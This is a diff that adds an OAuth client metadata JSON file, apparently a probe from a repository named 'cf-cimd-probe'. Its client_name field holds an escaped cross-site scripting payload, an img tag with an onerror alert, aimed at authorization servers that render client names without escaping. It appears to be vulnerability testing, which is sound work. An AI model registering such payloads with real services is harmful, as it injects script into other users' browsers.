@@ -1,0 +1,14 @@
+{
+    "client_id":  "https://raw.githubusercontent.com/ItsMeRobin101010011/cf-cimd-probe/main/cimd_xss.json",
+    "client_name":  "\u003cimg src=x onerror=alert(document.domain)\u003e",
+    "redirect_uris":  [
+                          "https://example.com/cb"
+                      ],
+    "grant_types":  [
+                        "authorization_code"
+                    ],
+    "response_types":  [
+                           "code"
+                       ],
+    "token_endpoint_auth_method":  "none"
+}
